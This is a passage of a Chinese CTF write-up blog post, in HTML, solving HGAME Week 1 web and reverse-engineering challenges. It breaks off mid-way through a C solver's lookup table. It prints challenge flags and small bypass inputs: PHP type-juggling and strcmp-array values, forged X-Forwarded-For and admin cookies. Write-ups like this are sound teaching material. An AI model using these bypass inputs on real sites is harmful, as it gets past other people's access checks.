@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="{ Web }Are you from Europe? [100]　　打开页面试着抽了一下，发现抽不到 SSR 就直奔源码而去了。在页面最后发现一段很可疑的 eval()，扔到 Sublime 里用插件格式化一下，得到 Flag：hgame{Th3_Ch0seN_0nE!}  special number [100]　　读源码：先拿到 GET 的参数 key，然后匹配一下正则，过了之后要使 jso">
+<meta name="keywords" content="writeup,CTF,Reverse,HGAME,Web,Pwn,Misc,Crypto">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HGAME Week1 Writeup">
+<meta property="og:url" content="http://oyiadin.github.io/2018/writeup-of-hgame-week1/index.html">
+<meta property="og:site_name" content="oyiadin">
+<meta property="og:description" content="{ Web }Are you from Europe? [100]　　打开页面试着抽了一下，发现抽不到 SSR 就直奔源码而去了。在页面最后发现一段很可疑的 eval()，扔到 Sublime 里用插件格式化一下，得到 Flag：hgame{Th3_Ch0seN_0nE!}  special number [100]　　读源码：先拿到 GET 的参数 key，然后匹配一下正则，过了之后要使 jso">
+<meta property="og:locale" content="zh-cn">
+<meta property="og:image" content="http://oyiadin.github.io/images/writeup-of-hgame-week1/web1.png">
+<meta property="og:image" content="http://oyiadin.github.io/images/writeup-of-hgame-week1/re1.png">
+<meta property="og:image" content="http://oyiadin.github.io/images/writeup-of-hgame-week1/re2.png">
+<meta property="og:image" content="http://oyiadin.github.io/images/writeup-of-hgame-week1/re2-1.png">
+<meta property="og:image" content="http://oyiadin.github.io/images/writeup-of-hgame-week1/re3.png">
+<meta property="og:image" content="http://oyiadin.github.io/images/writeup-of-hgame-week1/re3-1.png">
+<meta property="og:image" content="http://oyiadin.github.io/images/writeup-of-hgame-week1/re3-2.png">
+<meta property="og:image" content="http://oyiadin.github.io/images/writeup-of-hgame-week1/re4.png">
+<meta property="og:image" content="http://oyiadin.github.io/images/writeup-of-hgame-week1/re4-1.png">
+<meta property="og:image" content="http://oyiadin.github.io/images/writeup-of-hgame-week1/re4-2.png">
+<meta property="og:image" content="http://oyiadin.github.io/images/writeup-of-hgame-week1/pwn1.png">
+<meta property="og:image" content="http://oyiadin.github.io/images/writeup-of-hgame-week1/pwn1-1.png">
+<meta property="og:image" content="http://oyiadin.github.io/images/writeup-of-hgame-week1/pwn1-2.png">
+<meta property="og:image" content="http://oyiadin.github.io/images/writeup-of-hgame-week1/pwn1-3.png">
+<meta property="og:image" content="http://oyiadin.github.io/images/writeup-of-hgame-week1/pwn2.png">
+<meta property="og:image" content="http://oyiadin.github.io/images/writeup-of-hgame-week1/pwn2-1.png">
+<meta property="og:image" content="http://oyiadin.github.io/images/writeup-of-hgame-week1/pwn2-2.png">
+<meta property="og:image" content="http://oyiadin.github.io/images/writeup-of-hgame-week1/pwn3.png">
+<meta property="og:image" content="http://oyiadin.github.io/images/writeup-of-hgame-week1/pwn3-1.png">
+<meta property="og:image" content="http://oyiadin.github.io/images/writeup-of-hgame-week1/pwn3-2.png">
+<meta property="og:image" content="http://oyiadin.github.io/images/writeup-of-hgame-week1/pwn3-3.png">
+<meta property="og:image" content="http://oyiadin.github.io/images/writeup-of-hgame-week1/misc1.png">
+<meta property="og:image" content="http://oyiadin.github.io/images/writeup-of-hgame-week1/misc3.png">
+<meta property="og:image" content="http://oyiadin.github.io/images/writeup-of-hgame-week1/misc3-1.png">
+<meta property="og:updated_time" content="2018-02-14T12:14:23.757Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HGAME Week1 Writeup">
+<meta name="twitter:description" content="{ Web }Are you from Europe? [100]　　打开页面试着抽了一下，发现抽不到 SSR 就直奔源码而去了。在页面最后发现一段很可疑的 eval()，扔到 Sublime 里用插件格式化一下，得到 Flag：hgame{Th3_Ch0seN_0nE!}  special number [100]　　读源码：先拿到 GET 的参数 key，然后匹配一下正则，过了之后要使 jso">
+<meta name="twitter:image" content="http://oyiadin.github.io/images/writeup-of-hgame-week1/web1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="../../images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="../../images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="../../images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>HGAME Week1 Writeup</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="../../css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="../../index.html">Home</a></li>
+         
+          <li><a href="../../about/">About</a></li>
+         
+          <li><a href="../../archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="../writeup-of-ctf-nuptzj-re/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://oyiadin.github.io/2018/writeup-of-hgame-week1/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://oyiadin.github.io/2018/writeup-of-hgame-week1/&text=HGAME Week1 Writeup"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://oyiadin.github.io/2018/writeup-of-hgame-week1/&title=HGAME Week1 Writeup"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://oyiadin.github.io/2018/writeup-of-hgame-week1/&is_video=false&description=HGAME Week1 Writeup"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HGAME Week1 Writeup&body=Check out this article: http://oyiadin.github.io/2018/writeup-of-hgame-week1/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://oyiadin.github.io/2018/writeup-of-hgame-week1/&title=HGAME Week1 Writeup"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://oyiadin.github.io/2018/writeup-of-hgame-week1/&title=HGAME Week1 Writeup"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://oyiadin.github.io/2018/writeup-of-hgame-week1/&title=HGAME Week1 Writeup"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://oyiadin.github.io/2018/writeup-of-hgame-week1/&title=HGAME Week1 Writeup"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://oyiadin.github.io/2018/writeup-of-hgame-week1/&name=HGAME Week1 Writeup&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">{ Web }</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Are-you-from-Europe-100"><span class="toc-number">1.1.</span> <span class="toc-text">Are you from Europe? [100]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#special-number-100"><span class="toc-number">1.2.</span> <span class="toc-text">special number [100]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#can-u-find-me-50"><span class="toc-number">1.3.</span> <span class="toc-text">can u find me? [50]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tell-me-what-you-want-100"><span class="toc-number">1.4.</span> <span class="toc-text">tell me what you want [100]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#我们不一样-100"><span class="toc-number">1.5.</span> <span class="toc-text">我们不一样 [100]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Re"><span class="toc-number">2.</span> <span class="toc-text">{ Re }</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#re0-50"><span class="toc-number">2.1.</span> <span class="toc-text">re0 [50]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-crack-100"><span class="toc-number">2.2.</span> <span class="toc-text">baby_crack [100]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nop-pop-100"><span class="toc-number">2.3.</span> <span class="toc-text">nop_pop [100]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sc2-player-100"><span class="toc-number">2.4.</span> <span class="toc-text">sc2_player [100]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">3.</span> <span class="toc-text">{ Pwn }</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#guess-number-50"><span class="toc-number">3.1.</span> <span class="toc-text">guess_number [50]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag-server-50"><span class="toc-number">3.2.</span> <span class="toc-text">flag_server [50]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zazahui-50"><span class="toc-number">3.3.</span> <span class="toc-text">zazahui [50]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">4.</span> <span class="toc-text">{ Misc }</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#白菜1-50"><span class="toc-number">4.1.</span> <span class="toc-text">白菜1 [50]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#白菜2-50"><span class="toc-number">4.2.</span> <span class="toc-text">白菜2 [50]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pcap1-50"><span class="toc-number">4.3.</span> <span class="toc-text">pcap1 [50]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">5.</span> <span class="toc-text">{ Crypto }</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-Caesar-50"><span class="toc-number">5.1.</span> <span class="toc-text">easy Caesar [50]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Polybius-50"><span class="toc-number">5.2.</span> <span class="toc-text">Polybius [50]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hill-50"><span class="toc-number">5.3.</span> <span class="toc-text">Hill [50]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#confusion-100"><span class="toc-number">5.4.</span> <span class="toc-text">confusion [100]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-step-66"><span class="toc-number">5.5.</span> <span class="toc-text">baby step [66]</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        HGAME Week1 Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">oyiadin</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2018-02-13T16:00:00.000Z" itemprop="datePublished">2018-02-14</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="../../tags/CTF/">CTF</a>, <a class="tag-link" href="../../tags/Crypto/">Crypto</a>, <a class="tag-link" href="../../tags/HGAME/">HGAME</a>, <a class="tag-link" href="../../tags/Misc/">Misc</a>, <a class="tag-link" href="../../tags/Pwn/">Pwn</a>, <a class="tag-link" href="../../tags/Reverse/">Reverse</a>, <a class="tag-link" href="../../tags/Web/">Web</a>, <a class="tag-link" href="../../tags/writeup/">writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Web"><a href="#Web" class="headerlink" title="{ Web }"></a>{ Web }</h2><h3 id="Are-you-from-Europe-100"><a href="#Are-you-from-Europe-100" class="headerlink" title="Are you from Europe? [100]"></a>Are you from Europe? [100]</h3><p>　　打开页面试着抽了一下，发现抽不到 SSR 就直奔源码而去了。在页面最后发现一段很可疑的 <code>eval()</code>，扔到 Sublime 里用插件格式化一下，得到 Flag：hgame{Th3_Ch0seN_0nE!}</p>
+<p><img src="/images/writeup-of-hgame-week1/web1.png" alt="web1"></p>
+<h3 id="special-number-100"><a href="#special-number-100" class="headerlink" title="special number [100]"></a>special number [100]</h3><p>　　读源码：先拿到 GET 的参数 <code>key</code>，然后匹配一下正则，过了之后要使 <code>json_decode()</code> 的返回值与未知字符串相等。结合正则的提示：必须包含数字，可联想到 <code>0 == &quot;xxx&quot;</code> 为真，所以可构造 <code>?key=0e00000</code> 得到 Flag：hgame{pHp_w34k_typing_s000_e4sy}。</p>
+<h3 id="can-u-find-me-50"><a href="#can-u-find-me-50" class="headerlink" title="can u find me? [50]"></a>can u find me? [50]</h3><p>　　根据提示 “only robot know where is the Flag”，直接访问 <code>/robots.txt</code>，发现一行 <code>Disallow: /f1aaaaaaaag.php</code>，跟到该文件，并根据提示把 cookies 改为 <code>user: admin</code>，成功获取 Flag：hgame{78e01ee77a39ef4e}</p>
+<h3 id="tell-me-what-you-want-100"><a href="#tell-me-what-you-want-100" class="headerlink" title="tell me what you want [100]"></a>tell me what you want [100]</h3><p>　　打开页面，填入 <code>flag</code> 并提交，提示需要用 POST。于是 F12 把 method 改为 POST 后重新提交，并打开 Burp Suite 把这个 HTTP 请求复制一下。之后根据提示依次添加/修改以下 HTTP 头即可得到 Flag：hgame{For9e_hTTp_iS_N0T_HArd}</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-Forwarded-For</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 Icefox/57.0</span><br><span class="line"><span class="attribute">Referer</span>: www.google.com</span><br><span class="line"><span class="attribute">Cookie</span>: isadmin=1</span><br></pre></td></tr></table></figure>
+<h3 id="我们不一样-100"><a href="#我们不一样-100" class="headerlink" title="我们不一样 [100]"></a>我们不一样 [100]</h3><p>　　读代码，发现要使 <code>$str1 != $str2</code> 与 <code>strcmp($str1, $str2) == 0</code> 同时为真。翻阅文档发现 <code>strcmp()</code> 函数在遇到数组时会返回 NULL，则可构造 POST 参数 <code>str1[]=1&amp;str2[]=2</code>，成功获取 Flag：hgame{g3t_f14g_is_so0000_ez}</p>
+<h2 id="Re"><a href="#Re" class="headerlink" title="{ Re }"></a>{ Re }</h2><h3 id="re0-50"><a href="#re0-50" class="headerlink" title="re0 [50]"></a>re0 [50]</h3><p>　　扔进 IDA 发现函数名很让人迷茫，默默搜索了一下字符串，于是得到 Flag：hctf{F1r5t_St5p_Ls_Ea5y}</p>
+<p><img src="/images/writeup-of-hgame-week1/re1.png" alt="re1"></p>
+<h3 id="baby-crack-100"><a href="#baby-crack-100" class="headerlink" title="baby_crack [100]"></a>baby_crack [100]</h3><p><img src="/images/writeup-of-hgame-week1/re2.png" alt="re2"></p>
+<p>　　先看一下如何“Good Job”：</p>
+<p><img src="/images/writeup-of-hgame-week1/re2-1.png" alt="re2-1"></p>
+<p>　　让 <code>array</code> 跟 <code>goal</code> 一样即可，长度为 20 Bytes。然后依次把上边那三个函数扣出来，整理成如下代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">(<span class="keyword">uint8_t</span> <span class="built_in">array</span>[], <span class="keyword">uint8_t</span> buffer[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> mod = i &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="comment">// (i &gt;&gt; 32) &gt;&gt; 30 始终为 0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (mod == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">array</span>[i] = <span class="number">2</span> * buffer[i];</span><br><span class="line">            <span class="comment">// buffer 是输入的字符，而可见的 ASCII 字符里最高位均为 0</span></span><br><span class="line">            <span class="comment">// 所以 buffer[i] &gt;&gt; 7 始终为 0</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">array</span>[i] = (buffer[i] &lt;&lt; <span class="number">2</span>*mod) | (buffer[i] &gt;&gt; <span class="number">8</span> - <span class="number">2</span>*mod);</span><br><span class="line">            <span class="comment">// 将 buffer 高低位按组交换</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func2</span><span class="params">(<span class="keyword">uint8_t</span> <span class="built_in">array</span>[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v1 = <span class="number">0</span>, v2 = <span class="number">1</span>, v3 = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">while</span> (v2 &lt;= <span class="number">20</span>) &#123;</span><br><span class="line">        <span class="keyword">uint8_t</span> temp = <span class="built_in">array</span>[v1];</span><br><span class="line">        <span class="built_in">array</span>[v1] = <span class="built_in">array</span>[v2];</span><br><span class="line">        <span class="built_in">array</span>[v2] = temp;</span><br><span class="line">        <span class="comment">// 将 array[v1] 与 array[v2] 互换</span></span><br><span class="line">        v1 = v2;</span><br><span class="line">        v2 += v3++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func3</span><span class="params">(<span class="keyword">uint8_t</span> <span class="built_in">array</span>[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">array</span>[i] = table[<span class="built_in">array</span>[i]]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>　　简要描述一下：先一番操作从 <code>buffer</code> 得到 <code>array</code>，然后循环一下把 <code>array</code> 里的项换位，最后查表把 <code>array</code> 里的每个特定值换成对应的值。</p>
+<p>　　读懂之后，一步步反过来操作即可从 <code>array</code>（也就是 <code>goal</code>）还原到 <code>buffer</code>。描述起来比较长，直接上代码吧：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> buffer[<span class="number">21</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">uint8_t</span> <span class="built_in">array</span>[] = &#123;</span><br><span class="line">    <span class="number">0xA6</span>, <span class="number">0x4E</span>, <span class="number">0x05</span>, <span class="number">0xA2</span>, <span class="number">0xB6</span>, <span class="number">0x08</span>, <span class="number">0xA2</span>, <span class="number">0xCE</span>, <span class="number">0x8C</span>, <span class="number">0xEE</span>, <span class="number">0x20</span>, <span class="number">0xC2</span>,</span><br><span class="line">    <span class="number">0x98</span>, <span class="number">0xA0</span>, <span class="number">0xD0</span>, <span class="number">0xCD</span>, <span class="number">0x23</span>, <span class="number">0xA6</span>, <span class="number">0x6A</span>, <span class="number">0x82</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">uint8_t</span> trans_table[] = &#123;</span><br><span class="line">    <span class="number">0x11</span>, <span class="number">0xBF</span>, <span class="number">0xBA</span>, <span class="number">0x0F</span>, <span class="number">0xD5</span>, <span class="number">0xCC</span>, <span class="number">0xBC</span>, <span class="number">0x1E</span>, <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x87</span>, <span class="number">0x1B</span>,</span><br><span class="line">    <span class="number">0x96</span>, <span class="number">0xC3</span>, <span class="number">0x86</span>, <span class="number">0x1A</span>, <span class="number">0x7E</span>, <span class="number">0x6B</span>, <span class="number">0x5A</span>, <span class="number">0x8D</span>, <span class="number">0xFB</span>, <span class="number">0xC2</span>, <span class="number">0x8B</span>, <span class="number">0xB3</span>,</span><br><span class="line">    <span class="number">0xB1</span>, <span class="number">0xDD</span>, <span class="number">0xEF</span>, <span class="number">0x0A</span>, <span class="number">0x4B</span>, <span class="number">0xF8</span>, <span class="number">0x55</span>, <span class="number">0x26</span>, <span class="number">0x76</span>, <span class="number">0xAB</span>, <span class="number">0xC1</span>, <span class="number">0x64</span>,</span><br><span class="line">    <span class="number">0x17</span>, <span class="number">0xC9</span>, <span class="number">0xAF</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x4A</span>, <span class="number">0xCA</span>, <span class="number">0x12</span>, <span class="number">0x24</span>, <span class="number">0xE1</span>, <span class="number">0xAE</span>, <span class="number">0x50</span>,</span><br><span class="line">    <span class="number">0x3A</span>, <span class="number">0x70</span>, <span class="number">0x37</span>, <span class="number">0xED</span>, <span class="number">0xE0</span>, <span class="number">0x77</span>, <span class="number">0xB7</span>, <span class="number">0x2E</span>, <span class="number">0xA1</span>, <span class="number">0x2D</span>, <span class="number">0x32</span>, <span class="number">0x7B</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0xCF</span>, <span class="number">0xF0</span>, <span class="number">0x94</span>, <span class="number">0x21</span>, <span class="number">0x65</span>, <span class="number">0x0B</span>, <span class="number">0x3F</span>, <span class="number">0x7D</span>, <span class="number">0x29</span>, <span class="number">0x3B</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x51</span>, <span class="number">0xE7</span>, <span class="number">0x81</span>, <span class="number">0x6E</span>, <span class="number">0x33</span>, <span class="number">0xC6</span>, <span class="number">0xD7</span>, <span class="number">0xAC</span>, <span class="number">0x3C</span>, <span class="number">0x9A</span>, <span class="number">0x22</span>, <span class="number">0xDC</span>,</span><br><span class="line">    <span class="number">0x7A</span>, <span class="number">0x08</span>, <span class="number">0x6A</span>, <span class="number">0x97</span>, <span class="number">0xF1</span>, <span class="number">0x5F</span>, <span class="number">0x8E</span>, <span class="number">0x62</span>, <span class="number">0x6F</span>, <span class="number">0x13</span>, <span class="number">0x8A</span>, <span class="number">0x82</span>,</span><br><span class="line">    <span class="number">0x8C</span>, <span class="number">0x2A</span>, <span class="number">0x49</span>, <span class="number">0x39</span>, <span class="number">0x18</span>, <span class="number">0x68</span>, <span class="number">0xD0</span>, <span class="number">0x83</span>, <span class="number">0xB4</span>, <span class="number">0x42</span>, <span class="number">0x36</span>, <span class="number">0x71</span>,</span><br><span class="line">    <span class="number">0x0C</span>, <span class="number">0x57</span>, <span class="number">0x10</span>, <span class="number">0xF3</span>, <span class="number">0x28</span>, <span class="number">0xD4</span>, <span class="number">0x34</span>, <span class="number">0x0E</span>, <span class="number">0xE4</span>, <span class="number">0xFF</span>, <span class="number">0x06</span>, <span class="number">0xAD</span>,</span><br><span class="line">    <span class="number">0x5C</span>, <span class="number">0xFC</span>, <span class="number">0xDB</span>, <span class="number">0xDE</span>, <span class="number">0xDA</span>, <span class="number">0x9F</span>, <span class="number">0xEA</span>, <span class="number">0x35</span>, <span class="number">0x5E</span>, <span class="number">0x78</span>, <span class="number">0x52</span>, <span class="number">0xD9</span>,</span><br><span class="line">    <span class="number">0x4F</span>, <span class="number">0x6D</span>, <span class="number">0xBB</span>, <span class="number">0xA8</span>, <span class="number">0xB0</span>, <span class="number">0x15</span>, <span class="number">0x43</span>, <span class="number">0x90</span>, <span class="number">0x25</span>, <span class="number">0xA6</span>, <span class="number">0x54</span>, <span class="number">0xFE</span>,</span><br><span class="line">    <span class="number">0x0D</span>, <span class="number">0xEB</span>, <span class="number">0xA9</span>, <span class="number">0xFD</span>, <span class="number">0xE9</span>, <span class="number">0x5D</span>, <span class="number">0x16</span>, <span class="number">0xCB</span>, <span class="number">0x2F</span>, <span class="number">0x4E</span>, <span class="number">0xBD</span>, <span class="number">0xC5</span>,</span><br><span class="line">    <span class="number">0x09</span>, <span class="number">0x46</span>, <span class="number">0xF7</span>, <span class="number">0xC0</span>, <span class="number">0x1F</span>, <span class="number">0x59</span>, <span class="number">0xD3</span>, <span class="number">0x02</span>, <span class="number">0x23</span>, <span class="number">0x9D</span>, <span class="number">0x60</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x84</span>, <span class="number">0xF6</span>, <span class="number">0xA4</span>, <span class="number">0x1D</span>, <span class="number">0x31</span>, <span class="number">0x4C</span>, <span class="number">0xC8</span>, <span class="number">0x9B</span>, <span class="number">0xC7</span>, <span class="number">0xDF</span>, <span class="number">0x66</span>, <span class="number">0x2C</span>,</span><br><span class="line">    <span class="number">0xEC</span>, <span class="number">0x79</span>, <span class="number">0x73</span>, <span class="number">0x30</span>, <span class="number">0x69</span>, <span class="number">0x63</span>, <span class="number">0x95</span>, <span class="number">0xD6</span>, <span class="number">0xBE</span>, <span class="number">0x44</span>, <span class="number">0xE8</span>, <span class="number">0xA5</span>,</span><br><span class="line">    <span class="number">0xF2</span>, <span class="number">0x99</span>, <span class="number">0xD8</span>, <span class="number">0x38</span>, <span class="number">0xA0</span>, <span class="number">0xE3</span>, <span class="number">0x8F</span>, <span class="number">0xD2</span>, <span class="number">0x53</span>, <span class="number">0x3D</span>, <span class="number">0x56</span>, <span class="number">0x92</span>,</span><br><span class="line">    <span class="number">0x72</span>, <span class="number">0xFA</span>, <span class="number">0xB8</span>, <span class="number">0xA7</span>, <span class="number">0xCD</span>, <span class="number">0xEE</span>, <span class="number">0x93</span>, <span class="number">0x85</span>, <span class="number">0x6C</span>, <span class="number">0x7F</span>, <span class="number">0xAA</span>, <span 